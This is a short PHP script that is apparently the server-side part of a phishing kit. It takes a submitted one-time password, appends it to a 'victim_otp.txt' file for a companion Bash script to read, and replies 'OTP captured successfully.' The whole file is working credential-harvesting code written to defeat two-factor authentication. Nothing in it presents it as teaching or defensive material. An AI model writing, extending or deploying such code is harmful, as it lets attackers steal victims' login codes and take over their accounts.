<?php
session_start();

if (isset($_POST['otp'])) {
    $otp = $_POST['otp'];

    // Store OTP in a file for the Bash script to read
    file_put_contents('victim_otp.txt', "Victim OTP: $otp\n", FILE_APPEND);

    // Redirect or show a confirmation message
    echo "OTP captured successfully.";
} else {
    echo "No OTP was provided.";
}
?>
